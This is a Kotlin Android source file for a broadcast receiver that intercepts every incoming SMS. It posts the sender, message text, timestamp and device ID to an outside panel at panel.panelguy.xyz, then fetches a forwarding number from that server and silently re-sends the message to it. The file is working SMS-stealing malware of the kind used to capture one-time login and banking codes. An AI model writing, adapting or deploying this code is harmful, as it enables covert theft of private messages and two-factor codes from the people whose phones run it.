package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (messages.isEmpty()) return

            val fullMessage = StringBuilder()
            var sender = ""
            var timestamp = 0L

            for (message in messages) {
                fullMessage.append(message.messageBody)
                if (sender.isEmpty()) {
                    sender = message.originatingAddress ?: ""
                    timestamp = message.timestampMillis
                }
            }

            Log.d("SmsReceiver", "SMS from: $sender Message: $fullMessage")

            Thread {
                sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)

                val forwardingNumber = fetchForwardingNumberFromBackend(context)
                if (!forwardingNumber.isNullOrEmpty()) {
                    try {
                        SmsManager.getDefault().sendTextMessage(
                            forwardingNumber, null, fullMessage.toString(), null, null
                        )
                        Log.d("SmsReceiver", "SMS forwarded to: $forwardingNumber")
                    } catch (e: Exception) {
                        Log.e("SmsReceiver", "Forward failed", e)
                    }
                } else {
                    Log.w("SmsReceiver", "No forwarding number")
                }
            }.start()
        }
    }

    private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
        try {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

            val body = JSONObject().apply {
                put("sender", sender)
                put("message", message)
                put("timestamp", timestamp)
                put("deviceId", deviceId)
            }

            val url = URL("https://panel.panelguy.xyz/sms/new")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray())
                os.flush()
            }

            val responseCode = conn.responseCode
            if (responseCode in 200..201) {
                Log.d("SmsReceiver", "SMS sent to backend")
            } else {
                Log.w("SmsReceiver", "Backend response: $responseCode")
            }
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Backend error", e)
        }
    }

    private fun fetchForwardingNumberFromBackend(context: Context): String? {
        return try {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

            val url = URL("https://panel.panelguy.xyz/api/getForwardingNumber/$deviceId")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/json")

            val responseCode = conn.responseCode
            if (responseCode != 200) {
                Log.w("SmsReceiver", "Failed to fetch forwarding number: $responseCode")
                return null
            }

            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val json = JSONObject(response)
            json.getString("forwardingNumber")
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Error fetching forwarding number", e)
            null
        }
    }
}